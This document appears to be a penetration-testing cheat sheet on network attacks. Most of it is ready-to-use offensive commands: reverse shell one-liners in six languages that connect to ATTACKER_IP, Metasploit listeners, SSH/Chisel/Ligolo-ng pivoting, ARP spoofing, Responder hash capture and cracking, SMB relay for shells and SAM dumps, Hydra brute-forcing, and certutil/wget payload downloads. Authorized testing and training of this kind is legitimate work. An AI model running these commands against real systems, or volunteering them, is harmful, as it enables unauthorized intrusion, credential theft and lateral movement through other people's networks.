# 📡 Network Attacks & Exploitation

> **Focus:** Exploiting network protocols, pivoting through internal networks, and gaining access via network services.

---

## 📋 Network Attack Methodology

```
1. Network Discovery
   - ARP scan (netdiscover, arp-scan)
   - Ping sweep (nmap -sn)
   - Identify live hosts and services

2. Service Exploitation
   - Default credentials
   - Known CVEs (searchsploit)
   - Protocol-specific attacks
   - Brute-force (Hydra)

3. Man-in-the-Middle
   - ARP spoofing
   - DNS spoofing
   - LLMNR/NBT-NS poisoning
   - Traffic interception

4. Pivoting & Tunneling
   - SSH tunnels
   - Chisel / Ligolo-ng
   - Proxychains + SOCKS
   - Port forwarding
```

---

## 🐚 Reverse Shells

### Linux One-Liners
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e)
nc ATTACKER_IP PORT -e /bin/bash

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Windows One-Liners
```powershell
# PowerShell (one-liner)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"
```

### Shell Stabilization (Linux)
```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background shell
Ctrl+Z

# Step 3: Configure terminal
stty raw -echo; fg

# Step 4: Set environment
export TERM=xterm
export SHELL=bash
stty rows 40 cols 160
```

### Listener Setup
```bash
# Basic netcat
nc -lvnp 4444

# With rlwrap (arrow keys)
rlwrap nc -lvnp 4444

# Metasploit handler
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit -j
```

---

## 🔄 Pivoting & Tunneling

### SSH Tunneling
```bash
# Local Port Forward (access remote service via your machine)
# Access internal_target:80 via localhost:8080
ssh -L 8080:internal_target:80 user@pivot_host

# Remote Port Forward (expose your service to remote network)
ssh -R 8080:localhost:80 user@pivot_host

# Dynamic Port Forward (SOCKS proxy)
ssh -D 9050 user@pivot_host
# Then: proxychains nmap -sT internal_target
```

### Chisel
```bash
# Attacker (server)
chisel server --reverse --port 8000

# Target (client) - SOCKS proxy
chisel client ATTACKER_IP:8000 R:socks

# Target - specific port forward
chisel client ATTACKER_IP:8000 R:8080:internal_ip:80

# Use with proxychains (socks5 127.0.0.1 1080)
```

### Ligolo-ng
```bash
# Attacker (proxy)
./proxy -selfcert -laddr 0.0.0.0:11601

# Target (agent)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In proxy console:
session         # list sessions
start           # start tunnel

# Add route on attacker
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Proxychains
```bash
# Edit /etc/proxychains4.conf → socks5 127.0.0.1 1080

# Use with any tool
proxychains nmap -sT -Pn internal_target
proxychains curl http://internal_target
proxychains evil-winrm -i target -u admin -p pass
```

---

## 🎭 Man-in-the-Middle (MITM)

### ARP Spoofing
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

### LLMNR/NBT-NS Poisoning (Responder)
```bash
# Capture NetNTLMv2 hashes
responder -I eth0 -dwPv

# Crack captured hashes
hashcat -m 5600 hash.txt rockyou.txt
```

### SMB Relay
```bash
# 1. Disable SMB/HTTP in Responder.conf
# 2. Start Responder
responder -I eth0 -dwPv
# 3. Start relay
ntlmrelayx.py -tf targets.txt -smb2support
# 4. Wait for auth → automatic shell/SAM dump
```

---

## 📡 Service-Specific Attacks

### SMB (Port 445)
```bash
# Enumerate shares
smbclient -L //target -N
crackmapexec smb target -u '' -p '' --shares
smbmap -H target

# Access share
smbclient //target/share -U username

# Enumerate users
enum4linux -a target
rpcclient -U "" target -N

# Check EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 target
```

### FTP (Port 21)
```bash
# Anonymous login
ftp target    # user: anonymous, pass: anonymous

# Brute-force
hydra -l admin -P rockyou.txt ftp://target
```

### SSH (Port 22)
```bash
# Brute-force
hydra -l root -P rockyou.txt ssh://target -t 4

# Use found private key
chmod 600 id_rsa
ssh -i id_rsa user@target
```

### SNMP (Port 161)
```bash
# Enumerate
snmpwalk -v2c -c public target
onesixtyone -c community-strings.txt target
```

### DNS (Port 53)
```bash
# Zone transfer
dig axfr target.com @ns.target.com
dnsrecon -d target.com -t axfr
```

---

## 📂 File Transfer Methods

### To Linux Target
```bash
# Attacker hosts file
python3 -m http.server 80

# Target downloads
wget http://ATTACKER/file
curl http://ATTACKER/file -o file
```

### To Windows Target
```powershell
# PowerShell
Invoke-WebRequest -Uri http://ATTACKER/file -OutFile file.exe
certutil -urlcache -split -f http://ATTACKER/file file.exe

# SMB (attacker: impacket-smbserver share . -smb2support)
copy \\ATTACKER\share\file.exe C:\temp\
```

---

## 🔗 Associated Tools
- [Nmap](../../TOOLS/nmap.md) - Network scanning
- [Netcat](../../TOOLS/netcat.md) - Shells and file transfer
- [Hydra](../../TOOLS/hydra.md) - Brute-force
- [Metasploit](../../TOOLS/metasploit.md) - Exploitation framework
